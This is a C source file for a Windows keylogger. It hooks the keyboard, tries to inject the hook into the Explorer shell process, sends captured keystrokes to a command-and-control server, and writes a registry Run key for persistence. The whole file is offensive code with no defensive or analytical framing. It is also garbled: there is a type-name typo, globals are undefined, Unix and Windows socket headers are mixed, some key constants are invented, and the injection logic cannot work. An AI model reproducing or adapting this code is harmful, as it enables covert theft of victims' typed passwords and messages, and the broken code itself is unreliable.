#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winioctl.h>
#include <ws2tcpip.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdint.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Psapi.lib")

typedef struct {
    char* buffer;
    int capacity;
    int size;
    int head;
    int tail;
    int full;
} CircularKeystrokeBuffer;

CircularKeystrokeBuffer* create_circular_buffer(int capacity) {
    CircularKeystrokedBuffer* buf = (CircularKeystrokeBuffer*)malloc(sizeof(CircularKeystrokeBuffer));
    if (!buf) return NULL;
    buf->capacity = capacity;
    buf->size = 0;
    buf->head = 0;
    buf->tail = 0;
    buf->full = 0;
    buf->buffer = (char*)malloc(capacity);
    if (!buf->buffer) {
        free(buf);
        return NULL;
    }
    memset(buf->buffer, 0, capacity);
    return buf;
}

void append_char(CircularKeystrokeBuffer* buf, char c) {
    if (buf->full) {
        buf->tail = (buf->tail + 1) % buf->capacity;
    }
    buf->buffer[buf->head] = c;
    buf->head = (buf->head + 1) % buf->capacity;
    buf->size = (buf->size + 1) % buf->capacity;
    buf->full = (buf->size == buf->capacity);
}

void free_buffer(CircularKeystrokeBuffer* buf) {
    if (buf) {
        free(buf->buffer);
        free(buf);
    }
}

typedef struct {
    char* buffer;
    int capacity;
    int size;
} MemoryLeakBuffer;

MemoryLeakBuffer* create_leak_buffer(int capacity) {
    MemoryLeakBuffer* buf = (MemoryLeakBuffer*)malloc(sizeof(MemoryLeakBuffer));
    if (!buf) return NULL;
    buf->capacity = capacity;
    buf->size = 0;
    buf->buffer = (char*)malloc(capacity);
    if (!buf->buffer) {
        free(buf);
        return NULL;
    }
    return buf;
}

void leak_memory(MemoryLeakBuffer* buf) {
    if (buf->size < buf->capacity) {
        buf->buffer[buf->size++] = 'X';
    }
}

void free_leak_buffer(MemoryLeakBuffer* buf) {
    if (buf) {
        free(buf->buffer);
        free(buf);
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pk = (KBDLLHOOKSTRUCT*)lParam;
        char key = pk->vkCode;
        char keyChar = 0;

        if (key >= 'A' && key <= 'Z') {
            keyChar = key;
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyChar = key - 'A' + 'a';
            }
        } else if (key >= 'a' && key <= 'z') {
            keyChar = key;
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyChar = key - 'a' + 'A';
            }
        } else if (key == VK_BACK) keyChar = 8;
        else if (key == VK_TAB) keyChar = 9;
        else if (key == VK_RETURN) keyChar = 13;
        else if (key == VK_SPACE) keyChar = 32;
        else if (key == VK_SHIFT) keyChar = 16;
        else if (key == VK_CONTROL) keyChar = 17;
        else if (key == VK_MENU) keyChar = 18;
        else if (key == VK_CAPITAL) keyChar = 20;
        else if (key == VK_ESCAPE) keyChar = 27;
        else if (key == VK_F1) keyChar = 112;
        else if (key == VK_F2) keyChar = 113;
        else if (key == VK_F3) keyChar = 114;
        else if (key == VK_F4) keyChar = 115;
        else if (key == VK_F5) keyChar = 116;
        else if (key == VK_F6) keyChar = 117;
        else if (key == VK_F7) keyChar = 118;
        else if (key == VK_F8) keyChar = 119;
        else if (key == VK_F9) keyChar = 120;
        else if (key == VK_F10) keyChar = 121;
        else if (key == VK_F11) keyChar = 122;
        else if (key == VK_F12) keyChar = 123;
        else if (key == VK_DELETE) keyChar = 8;
        else if (key == VK_INSERT) keyChar = 23;
        else if (key == VK_HOME) keyChar = 24;
        else if (key == VK_END) keyChar = 25;
        else if (key == VK_LEFT) keyChar = 26;
        else if (key == VK_RIGHT) keyChar = 27;
        else if (key == VK_UP) keyChar = 28;
        else if (key == VK_DOWN) keyChar = 29;
        else if (key == VK_PRIOR) keyChar = 33;
        else if (key == VK_NEXT) keyChar = 34;
        else if (key == VK_CLEAR) keyChar = 35;
        else if (key == VK_PAUSE) keyChar = 32;
        else if (key == VK_NUMPAD0) keyChar = '0';
        else if (key == VK_NUMPAD1) keyChar = '1';
        else if (key == VK_NUMPAD2) keyChar = '2';
        else if (key == VK_NUMPAD3) keyChar = '3';
        else if (key == VK_NUMPAD4) keyChar = '4';
        else if (key == VK_NUMPAD5) keyChar = '5';
        else if (key == VK_NUMPAD6) keyChar = '6';
        else if (key == VK_NUMPAD7) keyChar = '7';
        else if (key == VK_NUMPAD8) keyChar = '8';
        else if (key == VK_NUMPAD9) keyChar = '9';
        else if (key == VK_DECIMAL) keyChar = '.';
        else if (key == VK_DIVIDE) keyChar = '/';
        else if (key == VK_MULTIPLY) keyChar = '*';
        else if (key == VK_SUBTRACT) keyChar = '-';
        else if (key == VK_ADD) keyChar = '+';
        else if (key == VK_SEPARATOR) keyChar = '=';
        else if (key == VK_OEM_1) keyChar = ';';
        else if (key == VK_OEM_2) keyChar = '/';
        else if (key == VK_OEM_3) keyChar = '\'';
        else if (key == VK_OEM_4) keyChar = '[';
        else if (key == VK_OEM_5) keyChar = '\\';
        else if (key == VK_OEM_6) keyChar = ']';
        else if (key == VK_OEM_7) keyChar = '"';
        else if (key == VK_OEM_8) keyChar = '`';
        else if (key == VK_OEM_PLUS) keyChar = '+';
        else if (key == VK_OEM_MINUS) keyChar = '-';
        else if (key == VK_OEM_COMMA) keyChar = ',';
        else if (key == VK_OEM_PERIOD) keyChar = '.';
        else if (key == VK_OEM_102) keyChar = '|';
        else if (key == VK_OEM_103) keyChar = '~';
        else if (key == VK_OEM_104) keyChar = '^';
        else if (key == VK_OEM_105) keyChar = '&';
        else if (key == VK_OEM_106) keyChar = '*';
        else if (key == VK_OEM_107) keyChar = '(';
        else if (key == VK_OEM_108) keyChar = ')';
        else if (key == VK_OEM_109) keyChar = '_';
        else if (key == VK_OEM_110) keyChar = '=';

        if (keyChar != 0) {
            if (!global_buffer) {
                global_buffer = create_circular_buffer(MAX_KEYSTROKES);
            }
            append_char(global_buffer, keyChar);

            if (rand() % 1000 == 0) {
                leak_memory(create_leak_buffer(1024 * 1024));
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void inject_keylogger() {
    DWORD pid = 0;
    HWND hWnd = FindWindow(NULL, "Shell_TrayWnd");
    if (hWnd) {
        GetWindowThreadProcessId(hWnd, &pid);
    } else {
        hWnd = FindWindow("WorkerW", NULL);
        if (hWnd) {
            GetWindowThreadProcessId(hWnd, &pid);
        }
    }

    if (pid == 0) {
        pid = GetCurrentProcessId();
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return;
    }

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(LowLevelKeyboardProc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBuffer) {
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, pRemoteBuffer, LowLevelKeyboardProc, sizeof(LowLevelKeyboardProc), NULL)) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    FARPROC lpProcAddress = GetProcAddress(hKernel32, "SetWindowsHookExA");
    if (!lpProcAddress) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        FreeLibrary(hKernel32);
        CloseHandle(hProcess);
        return;
    }

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)pRemoteBuffer, hKernel32, 0);
    if (!hHook) {
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        FreeLibrary(hKernel32);
        CloseHandle(hProcess);
        return;
    }

    if (!QueueUserAPC((PAPCFUNCTION)pRemoteBuffer, hProcess, 0)) {
        UnhookWindowsHookEx(hHook);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        FreeLibrary(hKernel32);
        CloseHandle(hProcess);
        return;
    }

    CloseHandle(hProcess);
    FreeLibrary(hKernel32);
}

void exfiltrate_data() {
    static SOCKET c2_socket = INVALID_SOCKET;
    static struct sockaddr_in c2_server;
    static int connected = 0;

    if (!connected) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        c2_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (c2_socket == INVALID_SOCKET) {
            return;
        }

        memset(&c2_server, 0, sizeof(c2_server));
        c2_server.sin_family = AF_INET;
        c2_server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_SERVER, &c2_server.sin_addr);

        if (connect(c2_socket, (struct sockaddr*)&c2_server, sizeof(c2_server)) == SOCKET_ERROR) {
            closesocket(c2_socket);
            c2_socket = INVALID_SOCKET;
            return;
        }
        connected = 1;
    }

    if (global_buffer && global_buffer->size > 0) {
        if (send(c2_socket, global_buffer->buffer, global_buffer->size, 0) == SOCKET_ERROR) {
            closesocket(c2_socket);
            connected = 0;
            return;
        }
    }
}

void save_keystrokes() {
    if (global_buffer && global_buffer->size > 0) {
        char* temp_path = "C:\\Windows\\Temp\\keystrokes.bin";
        FILE* file = fopen(temp_path, "wb");
        if (file) {
            fwrite(global_buffer->buffer, 1, global_buffer->size, file);
            fclose(file);
        }
        free_buffer(global_buffer);
        global_buffer = NULL;
    }
}

void persist_keylogger() {
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);
    char* exe_path = (char*)szPath;
    char* file_path = strrchr(exe_path, '\\');
    if (file_path) *file_path = '\0';

    char target_path[MAX_PATH];
    snprintf(target_path, MAX_PATH, "%s\\%s", exe_path, "keylogger.exe");

    if (CreateFile(target_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL) != INVALID_HANDLE_VALUE) {
        CloseHandle(CreateFile(target_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL));
    }

    if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDispid) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "Keylogger", 0, REG_SZ, (LPBYTE)target_path, strlen(target_path) + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    persist_keylogger();

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    c2_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (c2_socket == INVALID_SOCKET) return 1;

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!hKeyboardHook) return 1;

    Sleep(INJECTION_DELAY);

    inject_keylogger();

    Sleep(INJECTION_DELAY);

    exfiltrate_data();

    Sleep(INJECTION_DELAY);

    save_keystrokes();

    return 0;
}